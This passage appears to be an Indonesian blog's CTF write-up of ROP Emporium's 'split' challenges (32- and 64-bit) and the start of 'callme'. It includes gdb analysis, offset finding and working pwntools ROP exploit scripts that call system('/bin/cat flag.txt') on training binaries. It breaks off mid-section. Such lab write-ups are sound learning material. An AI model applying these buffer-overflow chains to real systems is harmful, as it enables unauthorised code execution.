</code></pre></td></tr></table></div></div><p>[created at: February 10, 2021]</p><h1 id=split>split<a hidden class=anchor aria-hidden=true href=#split>#</a></h1><table><thead><tr><th>File</th><th>Download</th></tr></thead><tbody><tr><td><a href=#ret2split32>ret2split32</a></td><td><a href=https://github.com/ahm4ddm/larebinex/blob/main/32/split32/split32>klik</a></td></tr><tr><td><a href=#ret2split64>ret2split64</a></td><td><a href=https://github.com/ahm4ddm/larebinex/blob/main/64/split/split64>klik</a></td></tr></tbody></table><h3 id=ret2split32>ret2split32<a hidden class=anchor aria-hidden=true href=#ret2split32>#</a></h3><p>Kita cek terlebih dahulu informasi file<br>didapatkan file ELF dan dynamically linked.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$file split32
split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped
</code></pre></td></tr></table></div></div><p>lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>kita bisa bypass NX dengan metode return oriented programming (rop).</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$checksec split32
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre></td></tr></table></div></div><p>kita cek semua fungsi menggunakan gdb.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
...
...
...
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804860c  usefulFunction
0x08048630  __libc_csu_init
0x08048690  __libc_csu_fini
0x08048694  _fini
</code></pre></td></tr></table></div></div><p>kita lakukan disassembly fungsi <em><strong>main</strong></em></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ pdisas main
Dump of assembler code for function main:
...
...
...
0x08048583 &lt;+61&gt;:	call   0x80483d0 &lt;puts@plt&gt;
0x08048588 &lt;+66&gt;:	add    esp,0x10
0x0804858b &lt;+69&gt;:	call   0x80485ad &lt;pwnme&gt;
...
...
...
</code></pre></td></tr></table></div></div><p>Pada fungsi main hanya memanggil fungsi <em><strong>pwnme</strong></em>.<br>kita disassembly fungsi <em><strong>pwnme</strong></em></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ pdisas pwnme
Dump of assembler code for function pwnme:
...
...
...
   0x080485ee &lt;+65&gt;:	push   eax
   0x080485ef &lt;+66&gt;:	push   0x0
   0x080485f1 &lt;+68&gt;:	call   0x80483b0 &lt;read@plt&gt;
   0x080485f6 &lt;+73&gt;:	add    esp,0x10
   0x080485f9 &lt;+76&gt;:	sub    esp,0xc
...
...
...
</code></pre></td></tr></table></div></div><p>Pada fungsi <em><strong>pwnme</strong></em> terdapat kerentanan <em><strong>read</strong></em> dimana tidak ada Null Byte pada saat input berakhir.<br>Tidak ada pemanggilan fungsi <em><strong>usefulFunction</strong></em> pada binary.<br>kita cek disassembly fungsi <em><strong>usefulFunction</strong></em>
ternyata ada pemanggilan <em><strong>system</strong></em></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ pdisas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804860c &lt;+0&gt;:	push   ebp
   0x0804860d &lt;+1&gt;:	mov    ebp,esp
   0x0804860f &lt;+3&gt;:	sub    esp,0x8
   0x08048612 &lt;+6&gt;:	sub    esp,0xc
   0x08048615 &lt;+9&gt;:	push   0x804870e
   0x0804861a &lt;+14&gt;:	call   0x80483e0 &lt;system@plt&gt;
   0x0804861f &lt;+19&gt;:	add    esp,0x10
   0x08048622 &lt;+22&gt;:	nop
   0x08048623 &lt;+23&gt;:	leave  
   0x08048624 &lt;+24&gt;:	ret    
End of assembler dump.
</code></pre></td></tr></table></div></div><p>Permasalahannya yaitu fungsi ini tidak memanggil <em><strong>system(cat flag.txt)</strong></em> melainkan memanggil <em><strong>system(/bin/ls)</strong></em><br>Pada challenge ini kita masih bisa memanggil <em><strong>/bin/cat flag.txt</strong></em></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Don&#39;t just take my word for it, let&#39;s check the call to system() and that useful string are actually here.
</code></pre></td></tr></table></div></div><p>Ingat argumen dari fungsi yang dijalankan pada arsitektur 32-bit disimpan pada stack.<br>setelah kita memanggil fungsi <em><strong>system yang benar</strong></em><br>lalu kita panggil <em><strong>/bin/cat flag.txt</strong></em></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>system() returns after the command has been completed.
</code></pre></td></tr></table></div></div><p>Kita cari dulu offset ke <em><strong>EIP</strong></em></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Registers contain pattern buffer:
ECX+52 found at offset: 69
EDX+52 found at offset: 69
EBP+0 found at offset: 40
EIP+0 found at offset: 44
Registers point to pattern buffer:
[ESP] --&gt; offset 48 - size ~114
Pattern buffer not found in memory
Reference to pattern buffer not found in memory
</code></pre></td></tr></table></div></div><p>didapatkan 44</p><p>Kita buat kode exploit</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>from pwn import *

p = ELF(&#39;./split32&#39;)
r = process(&#39;./split32&#39;)

sys = p.plt[&#39;system&#39;]
magic = next(p.search(b&#39;/bin/cat flag.txt\x00&#39;))
log.info(&#39;system 0x%x&#39; %sys)
log.info(&#39;magic 0x%x&#39; %magic)
junk = b&#39;X&#39;*44
payload = junk
payload += p32(sys)
payload += b&#39;Y&#39;*4
payload += p32(magic)
r.sendline(payload)
r.interactive()
</code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$python3 sol.py
split by ROP Emporium
x86

Contriving a reason to ask user for data...
&gt; Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
</code></pre></td></tr></table></div></div><h3 id=ret2split64>ret2split64<a hidden class=anchor aria-hidden=true href=#ret2split64>#</a></h3><p>Kita cek terlebih dahulu informasi file<br>didapatkan file ELF dan dynamically linked.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped
</code></pre></td></tr></table></div></div><p>lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>kita bisa bypass NX dengan metode return oriented programming (rop).</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$checksec split
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre></td></tr></table></div></div><p>Setelah dilakukan pengecekan dengan gdb, semua fungsi sama.<br>langsung saja ke proses exploit.<br>Sebelum itu, ingat argumen dari fungsi yang dijalankan pada arsitektur 64-bit disimpan pada register <a href=https://ctf101.org/binary-exploitation/what-are-calling-conventions/>RDI, RSI, RDX,RCX, R8, R9</a><br>Pertama kita cari offset terlebih dahulu</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RSP] --&gt; offset 40 - size ~56
Pattern buffer found at:
0x00007fffffffdf30 : offset    0 - size   96 ($sp + -0x28 [-10 dwords])
References to pattern buffer found at:
0x00007fffffffb340 : 0x00007fffffffdf30 ($sp + -0x2c18 [-2822 dwords])
0x00007fffffffdb40 : 0x00007fffffffdf30 ($sp + -0x418 [-262 dwords])
0x00007fffffffdb58 : 0x00007fffffffdf30 ($sp + -0x400 [-256 dwords])
</code></pre></td></tr></table></div></div><p>Didapatkan 40.<br>Kita buat kode exploit</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>from pwn import *

p = ELF(&#39;./split&#39;)
r = process(&#39;./split&#39;)
rop = ROP(&#39;./split&#39;)

sys = p.plt[&#39;system&#39;]
magic = next(p.search(b&#39;/bin/cat flag.txt&#39;))
popret = rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;])[0]
log.info(&#39;system 0x%x&#39; %sys)
log.info(&#39;magic 0x%x&#39; %magic)

junk = b&#39;X&#39;*40
payload = junk
payload += p64(popret)
payload += p64(magic)
payload += p64(sys)

r.sendline(payload)
r.interactive()
</code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$python3 sol.py
Contriving a reason to ask user for data...
&gt; Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
</code></pre></td></tr></table></div></div><p>[Created at: February 11, 2021]</p><h1 id=callme>callme<a hidden class=anchor aria-hidden=true href=#callme>#</a></h1><table><thead><tr><th>File</th><th>Download</th></tr></thead><tbody><tr><td><a href=#callme32>callme32</a></td><td><a href=https://github.com/ahm4ddm/larebinex/blob/main/32/callme32/callme32>klik</a></td></tr><tr><td><a href=#callme64>callme64</a></td><td><a href=https://github.com/ahm4ddm/larebinex/blob/main/64/callme/callme>klik</a></td></tr></tbody></table><h3 id=callme32>callme32<a hidden class=anchor aria-hidden=true href=#callme32>#</a></h3><p>kita cek terlebih dahulu filenya.<br>Didapatkan file ELF, dan dynamically linked</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$file callme
callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped
</code></pre></td></tr></table></div></div><p>lalu kita cek proteksi pada file.<br>didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>kita bisa bypass NX dengan metode return oriented programming (rop).</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
